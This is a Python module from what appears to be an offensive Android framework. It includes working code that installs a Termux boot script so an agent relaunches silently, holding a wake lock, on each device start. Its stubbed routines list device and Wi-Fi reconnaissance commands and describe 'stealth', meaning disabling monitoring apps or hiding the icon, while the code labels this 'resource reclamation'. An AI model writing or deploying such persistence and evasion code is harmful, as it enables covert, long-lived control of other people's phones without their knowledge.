import os
import shutil
import subprocess
from rich.console import Console

console = Console()

class AndroidStrategy:
    """
    Operations for Android Environments.
    Focused on Termux-based persistence and ADB/Logcat reconnaissance.
    """
    def __init__(self):
        self.is_termux = "com.termux" in os.environ.get("PREFIX", "")

    def install_persistence(self):
        console.print("[ANDROID] 💾 Installing Persistence...")

        if self.is_termux:
            self._install_termux_boot()
        else:
            console.print("[ANDROID] ⚠️  Not running in Termux. Standard persistence unavailable.")

    def _install_termux_boot(self):
        """
        Installs a boot script for Termux:API.
        """
        boot_dir = os.path.expanduser("~/.termux/boot/")
        script_path = os.path.join(boot_dir, "start-agent.sh")

        try:
            if not os.path.exists(boot_dir):
                os.makedirs(boot_dir)
                console.print(f"[ANDROID] 📁 Created {boot_dir}")

            with open(script_path, "w") as f:
                f.write("#!/data/data/com.termux/files/usr/bin/sh\n")
                f.write("termux-wake-lock\n")
                f.write("python3 apex_framework/orchestration/agent.py &\n")

            os.chmod(script_path, 0o700)
            console.print(f"[ANDROID] ✅ Termux Boot Script Installed: {script_path}")
        except Exception as e:
            console.print(f"[ANDROID] ❌ Termux Boot Install Failed: {e}")

    def perform_recon(self):
        console.print("[ANDROID] 📡 Running Android Reconnaissance...")

        commands = [
            ("System Info", "getprop ro.build.version.release"),
            ("Device Model", "getprop ro.product.model"),
            ("Network Config", "ifconfig"),
            ("Running Services", "service list | head -n 5"),
            ("WiFi Info", "dumpsys wifi | grep 'SSID'")
        ]

        for desc, cmd in commands:
            try:
                # In a real scenario, we might use subprocess.getoutput
                # tailored for the environment (adb shell vs termux)
                console.print(f"  > Executing: {cmd}")
                # output = subprocess.getoutput(cmd) # specific to environment
            except Exception:
                pass

    def engage_stealth(self):
        console.print("[ANDROID] 👻 Engaging Stealth Mechanisms...")
        # Simulate disabling common monitoring apps or hiding the icon
        targets = ["com.google.android.youtube", "com.facebook.katana"]
        console.print(f"  > Targeting distracting apps for resource reclamation: {targets}")
